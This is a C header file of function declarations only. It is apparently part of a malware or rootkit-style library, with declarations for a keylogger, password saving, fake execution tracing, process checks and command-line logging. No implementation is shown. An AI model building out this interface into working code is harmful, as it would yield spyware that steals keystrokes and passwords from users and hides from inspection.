#ifndef UTILS_H_
#define UTILS_H_

#include <dirent.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))

size_t strstrmem(char *s1, size_t len, char *s2);
void erasefree(char *str);
char *savepasswd(char *path, char *passwd);
int openfile(char *path);
int search_line(int fd, char *str, int len);
char *strchr_reverse(char *str, char c);
int endswith(char *s1, int len1, char *s2, int len2);
int fake_trace_objects(const char *pathname, char *const argv[],
                       char *const envp[]);
bool check_proc(DIR *dirp);
int keylogger(int fd, uint8_t *buf, size_t count, uint32_t *enable_switch);
char *log_cmd_line(void);

#endif // UTILS_H_
